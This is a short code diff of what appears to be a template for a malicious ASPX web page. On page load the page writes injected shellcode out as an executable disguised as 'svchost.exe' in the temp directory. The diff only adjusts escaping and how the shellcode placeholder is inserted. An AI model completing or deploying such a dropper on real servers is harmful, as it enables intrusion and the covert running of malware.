@@ -1,10 +1,10 @@
-<%@ Page Language="C#" AutoEventWireup="true" %>
-<%@ Import Namespace="System.IO" %>
+<%%@ Page Language="C#" AutoEventWireup="true" %%>
+<%%@ Import Namespace="System.IO" %%>
 <script runat="server">
 	protected void Page_Load(object sender, EventArgs e)
 	{
 		StringBuilder %{var_file} = new StringBuilder();
-		%{var_file}.Append("\x%{exe[0].to_s(16)}%{shellcode}");
+		%{shellcode}
 		string %{var_tempdir} = Path.GetTempPath();
 		string %{var_basedir} = Path.Combine(%{var_tempdir}, "%{var_filename}");
 		string %{var_tempexe} = Path.Combine(%{var_basedir}, "svchost.exe");
